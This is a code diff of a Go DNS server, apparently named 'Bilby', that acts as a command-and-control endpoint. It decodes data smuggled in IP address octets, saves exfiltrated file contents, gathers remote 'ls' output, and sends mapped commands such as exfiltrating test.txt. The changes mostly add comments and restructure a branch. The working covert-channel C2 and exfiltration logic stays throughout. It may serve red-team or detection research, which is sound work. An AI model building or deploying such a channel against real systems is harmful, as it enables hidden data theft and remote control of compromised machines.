@@ -24,31 +24,36 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 	// This example specifies that the client should exfiltrate (exf) the file test.txt to the server.
 	c2_mappings := map[string]string{"hbt": "cmd-exfil-single.test.txt"}
 
-	// If the first octet is equal to "172" or "185", the operation is setting the current baseline. Otherwise, decode the data using the baseline.
+	// If the first octet is equal to "172" or "185", the operation is setting the mode and current baseline. Otherwise, decode the data using the baseline.
 	if octets[0] == "172" || octets[0] == "185" {
 		val, err := strconv.Atoi(octets[3])
 		if err != nil {
 			log.Fatal(err)
 		}
 		*b = val
-		if octets[0] == "172" {
+
+		switch octets[0] {
+		case "172": // First octet of "172" denotes data exfiltration
 			*m = "exfil"
-		} else {
+		case "185": // First octet of "185" denotes c2 communication
 			*m = "c2"
 		}
 	} else {
-
+		// Gather the bytes encoded into the address
 		for i := 0; i < 3; i++ {
 			current_key, _ := strconv.Atoi(octets[0][i : i+1])
 			int_to_write, _ := strconv.Atoi(octets[i+1])
 
 			if current_key%2 == 0 {
-				// If the digit at the index of the octet being inspected is even, then the octet was 'flipped' back over from 255 back to 0 and above. If so, add 256 (the baseline is subtracted in either case).
+				// If the digit at the index of the octet being inspected is even, then the octet was wrapped back over from 255 back to 0 and above.
+				// If so, add 256 (the baseline is subtracted in either case).
 				int_to_write = int_to_write + 256
 			}
 			d2 := []byte{byte(int_to_write - *b)}
 			bytes = append(bytes, d2...)
 		}
+
+		// If the current mode is exfiltration, append the bytes to the output file ("recovered").
 		if *m == "exfil" {
 			// Open the file into which recovered data will be appended, with settings such that data can be added appropriately.
 			f, _ := os.OpenFile("recovered", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
@@ -59,7 +64,7 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 			if err := f.Close(); err != nil {
 				log.Fatal(err)
 			}
-		} else {
+		} else { // If the current mode is C2 communication, interpret the bytes as a command.
 			command := string(bytes[:])
 
 			if *c && command != "els" && command != "bls" {
@@ -71,17 +76,15 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 				}
 			}
 
-			if command == "bls" {
-				// Begin collecting the output bytes of the ls command
+			if command == "bls" { // Begin collecting the output bytes of the ls command
 				*c = true
-			} else if command == "els" {
+			} else if command == "els" { // Finish collecting the output bytes of the ls command, and output the gathered data.
 				fmt.Println("Output of 'ls':")
 				fmt.Printf("%v", string(*lsb))
 				*lsb = []byte{}
 				*c = false
-			} else {
+			} else { // Otherwise, return the c2 command outlined in the c2_mappings map.
 				c2_command = c2_mappings[command]
-
 			}
 		}
 	}
@@ -128,8 +131,8 @@ func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
 }
 
 func main() {
-
-	// Start up the server to communicate with the client
+	// Start the server to communicate with the client
+	// https://dev.to/jones_charles_ad50858dbc0/building-dns-resolution-and-domain-services-with-go-a-practical-guide-5d87
 	dns.HandleFunc(".", handleRequest)
 	server := &dns.Server{Addr: ":8053", Net: "udp"}
 	fmt.Println("Bilby Server running on :8053")
